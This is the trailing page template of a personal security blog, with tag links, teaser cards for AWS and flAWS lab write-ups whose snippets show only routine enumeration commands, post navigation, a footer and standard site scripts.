href="/blog/tags/lab/">lab</a> <a class="post-tag" href="/blog/tags/oscp/">oscp</a> <a class="post-tag" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag" href="/blog/tags/services/">services</a> <a class="post-tag" href="/blog/tags/productivity/">productivity</a> <a class="post-tag" href="/blog/tags/aws/">aws</a> <a class="post-tag" href="/blog/tags/programming/">programming</a> <a class="post-tag" href="/blog/tags/linux/">linux</a> <a class="post-tag" href="/blog/tags/reminders/">reminders</a> <a class="post-tag" href="/blog/tags/security/">security</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/blog/posts/flaws-2-attacker/"><div class="card-body"> <em class="small" data-ts="1683956520" data-df="ll" > May 13, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>flAWS 2 - Attacker</h3><div class="text-muted small"><p> Level 1 The problem statement is to enter a correct pin code on a website that is 100 digits long. The first thing to do is to look at the HTML source, where the form that takes the input sub...</p></div></div></a></div><div class="card"> <a href="/blog/posts/pentester-academy-aws-iam/"><div class="card-body"> <em class="small" data-ts="1651129200" data-df="ll" > Apr 28, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pentester Academy AWS IAM Attack Lab</h3><div class="text-muted small"><p> Enumeration To get information about current caller → 1 awsn sts get-identity-caller List and see last uses for access keys → 1 2 3 4 5 6 7 8 9 10 11 # List all access keys awsn ...</p></div></div></a></div><div class="card"> <a href="/blog/posts/pentester-academy-aws-s3/"><div class="card-body"> <em class="small" data-ts="1651129200" data-df="ll" > Apr 28, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pentester Academy AWS S3 Attack Lab</h3><div class="text-muted small"><p> Enumeration List buckets and get region for bucket → 1 2 3 4 5 # List buckets using s3api awsn s3api list-buckets | jq &#39;.Buckets[] | .Name&#39; | tr -d &quot;\&quot;&quot; # Get region for bucket a...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/blog/posts/github-secret-scan/" class="btn btn-outline-primary" prompt="Older"><p>10k GitHub Repositories Secret Scanning Code</p></a> <a href="/blog/posts/h1b-lottery-simulator/" class="btn btn-outline-primary" prompt="Newer"><p>H1B Lottery Simulator</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/blog/tags/lab/">lab</a> <a class="post-tag" href="/blog/tags/oscp/">oscp</a> <a class="post-tag" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag" href="/blog/tags/services/">services</a> <a class="post-tag" href="/blog/tags/productivity/">productivity</a> <a class="post-tag" href="/blog/tags/aws/">aws</a> <a class="post-tag" href="/blog/tags/programming/">programming</a> <a class="post-tag" href="/blog/tags/linux/">linux</a> <a class="post-tag" href="/blog/tags/reminders/">reminders</a> <a class="post-tag" href="/blog/tags/security/">security</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1.11.6/dayjs.min.js,npm/dayjs@1.11.6/locale/en.min.js,npm/dayjs@1.11.6/plugin/relativeTime.min.js,npm/dayjs@1.11.6/plugin/localizedFormat.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/blog/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B88HEPZBVJ"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-B88HEPZBVJ'); }); </script>
